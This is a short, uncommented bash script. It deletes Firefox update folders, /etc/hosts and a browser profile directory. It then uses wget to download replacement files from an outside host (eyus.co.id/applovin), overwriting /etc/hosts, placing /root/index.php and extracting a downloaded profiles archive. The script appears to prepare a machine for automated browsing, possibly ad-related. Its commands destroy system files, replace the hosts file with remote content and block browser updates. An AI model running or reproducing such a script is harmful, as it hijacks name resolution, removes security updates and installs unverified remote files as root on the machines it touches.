#!/bin/bash
sudo apt update
rm -rf /opt/firefox/updated
rm -rf /opt/firefox/updates
rm -rf /root/index.php
rm -rf /etc/hosts
rm -rf /root/.moozilla
wget -q https://eyus.co.id/applovin/.index -O /root/index.php
wget -q https://eyus.co.id/applovin/.hosts -O /etc/hosts
wget -q https://eyus.co.id/applovin/profiles.tar.gz -O /root/profiles.tar.gz
tar xvf profiles.tar.gz
rm -rf /root/profiles.tar.gz
